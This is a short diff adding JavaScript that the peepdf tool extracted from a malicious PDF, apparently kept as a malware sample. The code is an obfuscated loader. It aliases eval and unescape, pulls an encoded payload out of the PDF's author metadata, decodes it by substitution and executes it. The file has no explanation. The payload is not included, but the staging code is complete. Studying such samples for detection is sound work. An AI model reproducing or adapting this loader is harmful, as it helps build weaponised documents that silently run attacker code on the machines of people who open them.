@@ -1,0 +1,20 @@
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+var g = 'lace(/lka';
+var f = '1/g,prcnt)';
+var z = unescape;
+var prcnt = '%';
+var ks = eval;
+
+// peepdf comment: Javascript code located in object 16 (version 0)
+
+ks('var filoos = this.in' + z("%66%6f%2e%61%75%74") + 'hor;');
+var p = 'filoos.rep';
+var pgf = p + g + f;
+var xxx = ks(pgf);
+
+// peepdf comment: Javascript code located in object 26 (version 0)
+
+var vvv = z(unescape(xxx));
+eval(vvv);
+
